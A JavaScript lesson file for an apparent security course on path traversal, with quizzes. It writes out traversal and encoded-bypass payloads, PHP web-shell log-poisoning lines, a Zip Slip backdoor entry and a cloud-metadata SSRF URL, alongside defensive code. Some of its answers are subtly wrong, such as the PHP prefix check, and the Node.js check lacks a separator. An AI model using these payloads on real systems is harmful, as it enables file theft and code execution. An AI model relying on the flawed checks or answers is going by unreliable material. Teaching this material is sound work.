const LESSONS = [
  {
    title: "Path Traversal Basics",
    points: 10,
    content: `Imagine a giant public library. The librarian says, "You can read any book in the 'Children's Section'." When you want a book, you give the librarian a slip of paper with the book's title, and they fetch it from that section. But what if you are a sneaky hacker? Instead of writing a book title, you write, "Go out of the Children's Section, walk into the Staff Only room, and bring me the Secret Employee Rulebook!" If the librarian is acting like a robot and blindly follows your exact instructions without checking the rules, they will actually go grab the secret book and hand it to you! In computers, this is called Directory Traversal. A website might let you ask for an image or a document. But if you type special commands like "../" (which means "go backwards out of this room"), a lazy server will actually walk backwards into its own private folders and hand you its most secret, locked files!

WHAT IS IT?
Web servers serve files from a specific folder (e.g., /var/www/html). If an app takes a filename from user input without validation:
  http://site.com/view?file=report.pdf

An attacker traverses directories using ../ (dot-dot-slash):
  http://site.com/view?file=../../../etc/passwd

Each ../ moves up one directory level in the filesystem tree.

SENSITIVE FILES ON LINUX:
  /etc/passwd        → System user accounts (world-readable)
  /etc/shadow        → Password hashes (requires root)
  /etc/hostname      → Machine hostname
  /etc/hosts         → Host resolution table
  /proc/self/environ → Environment variables (may contain secrets/API keys)
  /proc/self/cmdline → Current process command line
  ~/.ssh/id_rsa      → SSH private key (if readable)
  /var/log/apache2/access.log → Web server logs

SENSITIVE FILES ON WINDOWS:
  C:\\Windows\\win.ini          → Windows configuration
  C:\\boot.ini                 → Boot configuration (older Windows)
  C:\\Windows\\System32\\drivers\\etc\\hosts → Host resolution
  C:\\inetpub\\wwwroot\\web.config → IIS config (may contain DB creds)

REAL-WORLD IMPACT:
  - Reading source code to find further vulnerabilities
  - Stealing configuration files with database credentials
  - Viewing SSH private keys to gain server access
  - Reading log files to find sensitive information

Modern web frameworks often have built-in protections, but custom file-serving code is frequently vulnerable.`,
    html: `<div class="htb-diagram-container"><img src="../../../assets/dir_basics_diagram.png" alt="Directory Traversal Basics"></div>

Imagine a giant public library. The librarian says, "You can read any book in the 'Children's Section'." When you want a book, you give the librarian a slip of paper with the book's title, and they fetch it from that section. But what if you are a sneaky hacker? Instead of writing a book title, you write, "Go out of the Children's Section, walk into the Staff Only room, and bring me the Secret Employee Rulebook!" If the librarian is acting like a robot and blindly follows your exact instructions without checking the rules, they will actually go grab the secret book and hand it to you! In computers, this is called Directory Traversal. A website might let you ask for an image or a document. But if you type special commands like "../" (which means "go backwards out of this room"), a lazy server will actually walk backwards into its own private folders and hand you its most secret, locked files!

WHAT IS IT?
Web servers serve files from a specific folder (e.g., /var/www/html). If an app takes a filename from user input without validation:
  http://site.com/view?file=report.pdf

An attacker traverses directories using ../ (dot-dot-slash):
  http://site.com/view?file=../../../etc/passwd

Each ../ moves up one directory level in the filesystem tree.

SENSITIVE FILES ON LINUX:
  /etc/passwd        → System user accounts (world-readable)
  /etc/shadow        → Password hashes (requires root)
  /etc/hostname      → Machine hostname
  /etc/hosts         → Host resolution table
  /proc/self/environ → Environment variables (may contain secrets/API keys)
  /proc/self/cmdline → Current process command line
  ~/.ssh/id_rsa      → SSH private key (if readable)
  /var/log/apache2/access.log → Web server logs

SENSITIVE FILES ON WINDOWS:
  C:\\Windows\\win.ini          → Windows configuration
  C:\\boot.ini                 → Boot configuration (older Windows)
  C:\\Windows\\System32\\drivers\\etc\\hosts → Host resolution
  C:\\inetpub\\wwwroot\\web.config → IIS config (may contain DB creds)

REAL-WORLD IMPACT:
  - Reading source code to find further vulnerabilities
  - Stealing configuration files with database credentials
  - Viewing SSH private keys to gain server access
  - Reading log files to find sensitive information

Modern web frameworks often have built-in protections, but custom file-serving code is frequently vulnerable.`,
    questions: [
      { q: "What symbol sequence is used to move up one directory level in path traversal?", a: "../" },
      { q: "What Linux file contains system user account information?", a: "/etc/passwd" },
      { q: "On Windows, what IIS config file may contain database credentials?", a: "web.config" },
      { q: "What Linux file contains environment variables that may include secrets?", a: "/proc/self/environ" },
      { q: "Why is path traversal particularly dangerous when combined with configuration files?", a: "Config files often contain database credentials or API keys" }
    ]
  },
  {
    title: "Defeating Path Traversal Filters",
    points: 10,
    content: `Developers try to block path traversal by filtering ../. Attackers have many creative bypass techniques.

BYPASS 1 — URL ENCODING:
  .  → %2e     /  → %2f     \\ → %5c
  Example: ../../../etc/passwd → %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

BYPASS 2 — DOUBLE URL ENCODING:
  If the app decodes input twice:
  %2e → %252e  (% becomes %25 after one decode)
  ../ → %252e%252e%252f

BYPASS 3 — ABSOLUTE PATHS:
  Skip traversal entirely: /etc/passwd directly
  (when the app blindly concatenates base_path + user_input)

BYPASS 4 — NESTED TRAVERSAL:
  If the filter removes ../ once (non-recursively):
  ....//  → after one removal becomes ../
  ..././  → after one removal becomes ../

BYPASS 5 — UNICODE/UTF-8 OVERLONG ENCODING:
  ..%c0%af  (overlong encoding of / on older systems)
  ..%ef%bc%8f  (Unicode full-width slash)

BYPASS 6 — NULL BYTE INJECTION (old PHP trick):
  ../../../etc/passwd%00.jpg
  The %00 terminates the string; .jpg is ignored.

BYPASS 7 — WINDOWS BACKSLASH:
  ..\\..\\..\\ (Windows paths)
  ..//../../  (mixed slashes)

PREVENTION BEST PRACTICES:
  - Use a whitelist of allowed filenames (never blacklists)
  - Resolve the canonical path, then check it starts with an allowed base
  - Avoid passing user input directly to file functions
  - Use a dedicated file access library with built-in protections`,
    html: `<div class="htb-diagram-container"><img src="../../../assets/dir_filters_diagram.png" alt="Defeating Path Traversal Filters"></div>

Developers try to block path traversal by filtering ../. Attackers have many creative bypass techniques.

BYPASS 1 — URL ENCODING:
  .  → %2e     /  → %2f     \\ → %5c
  Example: ../../../etc/passwd → %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

BYPASS 2 — DOUBLE URL ENCODING:
  If the app decodes input twice:
  %2e → %252e  (% becomes %25 after one decode)
  ../ → %252e%252e%252f

BYPASS 3 — ABSOLUTE PATHS:
  Skip traversal entirely: /etc/passwd directly
  (when the app blindly concatenates base_path + user_input)

BYPASS 4 — NESTED TRAVERSAL:
  If the filter removes ../ once (non-recursively):
  ....//  → after one removal becomes ../
  ..././  → after one removal becomes ../

BYPASS 5 — UNICODE/UTF-8 OVERLONG ENCODING:
  ..%c0%af  (overlong encoding of / on older systems)
  ..%ef%bc%8f  (Unicode full-width slash)

BYPASS 6 — NULL BYTE INJECTION (old PHP trick):
  ../../../etc/passwd%00.jpg
  The %00 terminates the string; .jpg is ignored.

BYPASS 7 — WINDOWS BACKSLASH:
  ..\\..\\..\\ (Windows paths)
  ..//../../  (mixed slashes)

PREVENTION BEST PRACTICES:
  - Use a whitelist of allowed filenames (never blacklists)
  - Resolve the canonical path, then check it starts with an allowed base
  - Avoid passing user input directly to file functions
  - Use a dedicated file access library with built-in protections`,
    questions: [
      { q: "What encoding replaces '.' with '%2e' and '/' with '%2f'?", a: "URL encoding" },
      { q: "What character acts as a string terminator in old PHP applications (null byte injection)?", a: "Null byte (%00)" },
      { q: "What is better for preventing path traversal: a whitelist or a blacklist of filenames?", a: "Whitelist" },
      { q: "What nested traversal payload bypasses a filter that only removes ../ once?", a: "....// (becomes ../ after one removal)" },
      { q: "What approach resolves the full file path and checks if it starts within an allowed directory?", a: "Canonical path validation" }
    ]
  },
  {
    title: "Directory Traversal Tools & Testing",
    points: 10,
    content: `Professional security testers use specialized tools to discover and exploit directory traversal vulnerabilities.

TESTING TOOLS:

Burp Suite (Manual Testing):
  - Intercept file requests in the proxy
  - Use Repeater to test ../ payloads manually
  - Use Intruder with a traversal wordlist to automate payload testing
  - Scanner can automatically detect some traversal flaws

dotdotpwn (Automated Fuzzer):
  - Specialized tool for directory traversal testing
  - Can test HTTP, FTP, TFTP, and other protocols
  - Uses extensive payloads including encoded variants
  Example: dotdotpwn -m http -h target.com -U "/view?file=TRAVERSAL"

ffuf / gobuster (Directory Fuzzing):
  - Fuzz file parameter values with traversal payloads
  Example: ffuf -u "http://site.com/file?path=FUZZ" -w traversal-payloads.txt

DETECTION SIGNS:
  - URL parameters containing filenames: ?file=, ?path=, ?doc=, ?page=, ?template=
  - Applications serving static files dynamically
  - PDF viewers, log viewers, configuration editors

COMPLETE PREVENTION:

Method 1 — Canonical Path Check (Python example):
  import os
  base = "/var/www/files"
  user_input = request.args.get("file")
  requested = os.path.realpath(os.path.join(base, user_input))
  if not requested.startswith(base):
      abort(403)  # Block the request

Method 2 — Filename-Only Allowlist:
  ALLOWED = {"report.pdf", "manual.pdf", "terms.txt"}
  if user_input not in ALLOWED:
      abort(403)

Method 3 — Indirect File Reference:
  ?file=1 → maps to report.pdf (server-side mapping)
  ?file=2 → maps to manual.pdf
  The actual filename never comes from user input.`,
    html: `<div class="htb-diagram-container"><img src="../../../assets/dir_tools_diagram.png" alt="Directory Traversal Testing & Tools"></div>

Professional security testers use specialized tools to discover and exploit directory traversal vulnerabilities.

TESTING TOOLS:

Burp Suite (Manual Testing):
  - Intercept file requests in the proxy
  - Use Repeater to test ../ payloads manually
  - Use Intruder with a traversal wordlist to automate payload testing
  - Scanner can automatically detect some traversal flaws

dotdotpwn (Automated Fuzzer):
  - Specialized tool for directory traversal testing
  - Can test HTTP, FTP, TFTP, and other protocols
  - Uses extensive payloads including encoded variants
  Example: dotdotpwn -m http -h target.com -U "/view?file=TRAVERSAL"

ffuf / gobuster (Directory Fuzzing):
  - Fuzz file parameter values with traversal payloads
  Example: ffuf -u "http://site.com/file?path=FUZZ" -w traversal-payloads.txt

DETECTION SIGNS:
  - URL parameters containing filenames: ?file=, ?path=, ?doc=, ?page=, ?template=
  - Applications serving static files dynamically
  - PDF viewers, log viewers, configuration editors

COMPLETE PREVENTION:

Method 1 — Canonical Path Check (Python example):
  import os
  base = "/var/www/files"
  user_input = request.args.get("file")
  requested = os.path.realpath(os.path.join(base, user_input))
  if not requested.startswith(base):
      abort(403)  # Block the request

Method 2 — Filename-Only Allowlist:
  ALLOWED = {"report.pdf", "manual.pdf", "terms.txt"}
  if user_input not in ALLOWED:
      abort(403)

Method 3 — Indirect File Reference:
  ?file=1 → maps to report.pdf (server-side mapping)
  ?file=2 → maps to manual.pdf
  The actual filename never comes from user input.`,
    questions: [
      { q: "What Burp Suite module is used to automate directory traversal payload testing?", a: "Intruder" },
      { q: "What Python function resolves the absolute canonical path, eliminating all ../ segments?", a: "os.path.realpath()" },
      { q: "What common URL parameter name suggests potential path traversal vulnerability?", a: "file (or path, doc, page, template)" },
      { q: "What prevention method uses numeric IDs instead of filenames, so user input never includes a real path?", a: "Indirect file reference (mapping IDs to files server-side)" },
      { q: "What HTTP status code should be returned when a traversal attempt is blocked?", a: "403 (Forbidden)" }
    ]
  },
  {
    title: "Log Poisoning via Path Traversal",
    points: 10,
    content: `Log Poisoning is an advanced attack that combines path traversal with Remote Code Execution (RCE). By reading log files through traversal, an attacker can escalate to full code execution.

HOW LOG POISONING WORKS:
  1. Attacker identifies path traversal vulnerability
  2. Uses traversal to read Apache/Nginx access logs
  3. Discovers the log stores the User-Agent header verbatim
  4. Sends a request with a PHP payload in the User-Agent:
        User-Agent: <?php system($_GET['cmd']); ?>
  5. The PHP code is now saved inside the access log
  6. Uses path traversal to include the log file:
        ?file=../../../var/log/apache2/access.log&cmd=whoami
  7. The server executes the PHP from the log — full RCE achieved!

COMMON LOG FILE LOCATIONS:
  Apache (Linux):
    /var/log/apache2/access.log
    /var/log/apache2/error.log
  Nginx:
    /var/log/nginx/access.log
    /var/log/nginx/error.log
  SSH:
    /var/log/auth.log  (poisoned via SSH login attempts)
    /var/log/secure    (CentOS/RHEL)
  Mail:
    /var/log/mail
  PHP session files (also exploitable):
    /var/lib/php/sessions/sess_SESSIONID

SSH LOG POISONING:
  ssh '<?php system($_GET["cmd"]); ?>'@target.com
  (The invalid username is logged to /var/log/auth.log)
  Then traverse to auth.log to trigger execution.

PHPINFO() RACE CONDITION:
  If phpinfo() is accessible, it reveals the temporary file location
  of uploaded files. Attack: upload a PHP shell, race to include the
  temp file before it is deleted. Requires fast scripting.

WHY THIS MATTERS:
  Path traversal + LFI (Local File Inclusion) = code execution
  Always assume traversal can escalate to RCE if logs are readable.`,
    html: `<div class="htb-diagram-container"><img src="../../../assets/dir_poisoning_diagram.png" alt="Log Poisoning via LFI / Path Traversal"></div>

Log Poisoning is an advanced attack that combines path traversal with Remote Code Execution (RCE). By reading log files through traversal, an attacker can escalate to full code execution.

HOW LOG POISONING WORKS:
  1. Attacker identifies path traversal vulnerability
  2. Uses traversal to read Apache/Nginx access logs
  3. Discovers the log stores the User-Agent header verbatim
  4. Sends a request with a PHP payload in the User-Agent:
        User-Agent: <?php system($_GET['cmd']); ?>
  5. The PHP code is now saved inside the access log
  6. Uses path traversal to include the log file:
        ?file=../../../var/log/apache2/access.log&cmd=whoami
  7. The server executes the PHP from the log — full RCE achieved!

COMMON LOG FILE LOCATIONS:
  Apache (Linux):
    /var/log/apache2/access.log
    /var/log/apache2/error.log
  Nginx:
    /var/log/nginx/access.log
    /var/log/nginx/error.log
  SSH:
    /var/log/auth.log  (poisoned via SSH login attempts)
    /var/log/secure    (CentOS/RHEL)
  Mail:
    /var/log/mail
  PHP session files (also exploitable):
    /var/lib/php/sessions/sess_SESSIONID

SSH LOG POISONING:
  ssh '<?php system($_GET["cmd"]); ?>'@target.com
  (The invalid username is logged to /var/log/auth.log)
  Then traverse to auth.log to trigger execution.

PHPINFO() RACE CONDITION:
  If phpinfo() is accessible, it reveals the temporary file location
  of uploaded files. Attack: upload a PHP shell, race to include the
  temp file before it is deleted. Requires fast scripting.

WHY THIS MATTERS:
  Path traversal + LFI (Local File Inclusion) = code execution
  Always assume traversal can escalate to RCE if logs are readable.`,
    questions: [
      { q: "What is the technique of injecting PHP code into a server log file called?", a: "Log poisoning" },
      { q: "What HTTP header is commonly poisoned with PHP code in log poisoning attacks?", a: "User-Agent" },
      { q: "What is the default Apache access log path on Linux systems?", a: "/var/log/apache2/access.log" },
      { q: "What happens when a path traversal vulnerability reads a poisoned log file containing PHP code?", a: "The PHP code executes on the server (Remote Code Execution)" },
      { q: "What Linux log file can be poisoned by making an SSH login attempt with PHP code as the username?", a: "/var/log/auth.log" }
    ]
  },
  {
    title: "Path Traversal in APIs & Cloud",
    points: 10,
    content: `Path traversal isn't limited to classic web servers — it appears in modern REST APIs, mobile backends, and cloud-native applications.

PATH TRAVERSAL IN REST APIs:
  APIs that return files based on path parameters:
    GET /api/v1/files/{filename}
    GET /api/reports?name=Q1.pdf

  Exploitation:
    GET /api/v1/files/../../../../etc/passwd
    GET /api/reports?name=../../../app/config/database.yml

  Often harder to detect because:
  - No browser address bar to inspect
  - Encoded in JSON request bodies
  - Parameters nested in complex objects

ZIP SLIP (Archive Extraction Traversal):
  A path traversal variant where malicious archives contain
  files with ../ in their names. When extracted, these overwrite
  files outside the target directory.

  Malicious zip entry: ../../../../etc/cron.d/backdoor
  If extracted as root: attacker installs a cron job!

  Affected libraries: older Java ZipInputStream, Python zipfile,
  Ruby zip gem, npm adm-zip.
  Fix: Always validate entry paths before extraction.

CLOUD STORAGE TRAVERSAL (S3/Azure/GCP):
  Misconfigured cloud object storage can expose files:
  - Open S3 buckets: http://bucket.s3.amazonaws.com/
  - Path traversal in presigned URLs
  - SSRF to access cloud metadata:
      http://169.254.169.254/latest/meta-data/
      (Leaks cloud credentials!)

CONTAINER / DOCKER TRAVERSAL:
  Docker volume mounts: if a container mounts /host as /data,
  traversal to /data/../../etc/passwd reads the HOST's /etc/passwd.

CVE EXAMPLES:
  - CVE-2021-41773: Apache HTTP Server 2.4.49 path traversal
    Allowed traversal outside the document root.
    CVSS Score: 7.5 (High). Patched in 2.4.50.
  - CVE-2019-18935: Telerik UI path traversal → RCE
  - CVE-2018-1002105: Kubernetes path traversal in API server`,
    html: `<div class="htb-diagram-container"><img src="../../../assets/dir_cloud_diagram.png" alt="Path Traversal in APIs & Cloud"></div>

Path traversal isn't limited to classic web servers — it appears in modern REST APIs, mobile backends, and cloud-native applications.

PATH TRAVERSAL IN REST APIs:
  APIs that return files based on path parameters:
    GET /api/v1/files/{filename}
    GET /api/reports?name=Q1.pdf

  Exploitation:
    GET /api/v1/files/../../../../etc/passwd
    GET /api/reports?name=../../../app/config/database.yml

  Often harder to detect because:
  - No browser address bar to inspect
  - Encoded in JSON request bodies
  - Parameters nested in complex objects

ZIP SLIP (Archive Extraction Traversal):
  A path traversal variant where malicious archives contain
  files with ../ in their names. When extracted, these overwrite
  files outside the target directory.

  Malicious zip entry: ../../../../etc/cron.d/backdoor
  If extracted as root: attacker installs a cron job!

  Affected libraries: older Java ZipInputStream, Python zipfile,
  Ruby zip gem, npm adm-zip.
  Fix: Always validate entry paths before extraction.

CLOUD STORAGE TRAVERSAL (S3/Azure/GCP):
  Misconfigured cloud object storage can expose files:
  - Open S3 buckets: http://bucket.s3.amazonaws.com/
  - Path traversal in presigned URLs
  - SSRF to access cloud metadata:
      http://169.254.169.254/latest/meta-data/
      (Leaks cloud credentials!)

CONTAINER / DOCKER TRAVERSAL:
  Docker volume mounts: if a container mounts /host as /data,
  traversal to /data/../../etc/passwd reads the HOST's /etc/passwd.

CVE EXAMPLES:
  - CVE-2021-41773: Apache HTTP Server 2.4.49 path traversal
    Allowed traversal outside the document root.
    CVSS Score: 7.5 (High). Patched in 2.4.50.
  - CVE-2019-18935: Telerik UI path traversal → RCE
  - CVE-2018-1002105: Kubernetes path traversal in API server`,
    questions: [
      { q: "What is Zip Slip?", a: "A path traversal attack via malicious archive entry names containing ../ that overwrite files outside the target directory" },
      { q: "What cloud metadata IP address can be accessed via SSRF or path traversal to steal cloud credentials?", a: "169.254.169.254" },
      { q: "What CVE number identified the critical Apache HTTP Server 2.4.49 path traversal vulnerability?", a: "CVE-2021-41773" },
      { q: "In a Docker container, why can path traversal reach the host filesystem?", a: "Because volume mounts expose host directories inside the container" },
      { q: "In a REST API endpoint like /api/files/{filename}, what input would a tester use to test for path traversal?", a: "../../../../etc/passwd" }
    ]
  },
  {
    title: "Real-World Cases & Secure Coding",
    points: 10,
    content: `Understanding real breaches caused by path traversal helps reinforce why this class of vulnerability is so dangerous.

NOTABLE REAL-WORLD INCIDENTS:

1. APACHE HTTP SERVER (CVE-2021-41773 & 41772):
   October 2021: Apache 2.4.49 introduced a path traversal bug.
   URL: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
   This allowed reading any file on the system, and combined with
   CGI enabled, led to Remote Code Execution. Patch: upgrade to 2.4.51.
   Lesson: Always apply security patches immediately.

2. SAMSUNG GALAXY APP STORE (2023):
   Allowed path traversal in app downloads, enabling installation of
   arbitrary apps outside the app store. CVE-2023-21433/21434.

3. KUBERNETES (CVE-2018-1002105):
   Path traversal in the Kubernetes API server allowed privilege
   escalation to cluster admin on all versions before 1.10.11.

SECURE CODING PATTERNS:

Python (Flask):
  import os
  from flask import abort, send_file

  BASE_DIR = "/var/www/files"

  @app.route("/file")
  def serve_file():
      filename = request.args.get("name", "")
      # Sanitize: strip ../ and leading /
      safe_name = os.path.basename(filename)
      full_path = os.path.realpath(os.path.join(BASE_DIR, safe_name))
      # Verify stays within base
      if not full_path.startswith(BASE_DIR + os.sep):
          abort(403)
      return send_file(full_path)

Node.js (Express):
  const path = require("path");
  const BASE = path.resolve("/var/www/files");

  app.get("/file", (req, res) => {
    const requested = path.resolve(BASE, req.query.name || "");
    if (!requested.startsWith(BASE)) {
      return res.status(403).send("Forbidden");
    }
    res.sendFile(requested);
  });

PHP:
  $base = realpath("/var/www/files");
  $requested = realpath($base . "/" . $_GET["file"]);
  if ($requested === false || strpos($requested, $base) !== 0) {
      http_response_code(403); exit;
  }
  readfile($requested);

KEY PRINCIPLES:
   Never trust user-supplied paths
   Always resolve to canonical/real path before comparison
   Serve files through code that validates the path
   Store sensitive files outside the web root entirely
   Apply least-privilege: web process should not read /etc/shadow`,
    html: `<div class="htb-diagram-container"><img src="../../../assets/dir_defense_diagram.png" alt="Path Traversal Secure Coding"></div>

Understanding real breaches caused by path traversal helps reinforce why this class of vulnerability is so dangerous.

NOTABLE REAL-WORLD INCIDENTS:

1. APACHE HTTP SERVER (CVE-2021-41773 & 41772):
   October 2021: Apache 2.4.49 introduced a path traversal bug.
   URL: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
   This allowed reading any file on the system, and combined with
   CGI enabled, led to Remote Code Execution. Patch: upgrade to 2.4.51.
   Lesson: Always apply security patches immediately.

2. SAMSUNG GALAXY APP STORE (2023):
   Allowed path traversal in app downloads, enabling installation of
   arbitrary apps outside the app store. CVE-2023-21433/21434.

3. KUBERNETES (CVE-2018-1002105):
   Path traversal in the Kubernetes API server allowed privilege
   escalation to cluster admin on all versions before 1.10.11.

SECURE CODING PATTERNS:

Python (Flask):
  import os
  from flask import abort, send_file

  BASE_DIR = "/var/www/files"

  @app.route("/file")
  def serve_file():
      filename = request.args.get("name", "")
      # Sanitize: strip ../ and leading /
      safe_name = os.path.basename(filename)
      full_path = os.path.realpath(os.path.join(BASE_DIR, safe_name))
      # Verify stays within base
      if not full_path.startswith(BASE_DIR + os.sep):
          abort(403)
      return send_file(full_path)

Node.js (Express):
  const path = require("path");
  const BASE = path.resolve("/var/www/files");

  app.get("/file", (req, res) => {
    const requested = path.resolve(BASE, req.query.name || "");
    if (!requested.startsWith(BASE)) {
      return res.status(403).send("Forbidden");
    }
    res.sendFile(requested);
  });

PHP:
  $base = realpath("/var/www/files");
  $requested = realpath($base . "/" . $_GET["file"]);
  if ($requested === false || strpos($requested, $base) !== 0) {
      http_response_code(403); exit;
  }
  readfile($requested);

KEY PRINCIPLES:
   Never trust user-supplied paths
   Always resolve to canonical/real path before comparison
   Serve files through code that validates the path
   Store sensitive files outside the web root entirely
   Apply least-privilege: web process should not read /etc/shadow`,
    questions: [
      { q: "What Apache version introduced the critical CVE-2021-41773 path traversal vulnerability?", a: "Apache HTTP Server 2.4.49" },
      { q: "In secure Python code, what function strips directory components, returning only the filename?", a: "os.path.basename()" },
      { q: "In Node.js, what function resolves a path to its absolute form, resolving all ../ segments?", a: "path.resolve()" },
      { q: "What key secure coding principle ensures sensitive files (like /etc/shadow) can't be reached even if traversal succeeds?", a: "Storing sensitive files outside the web root" },
      { q: "What check in PHP confirms the resolved path starts within the allowed base directory?", a: "strpos($requested, $base) !== 0 (or using str_starts_with)" }
    ]
  }
];
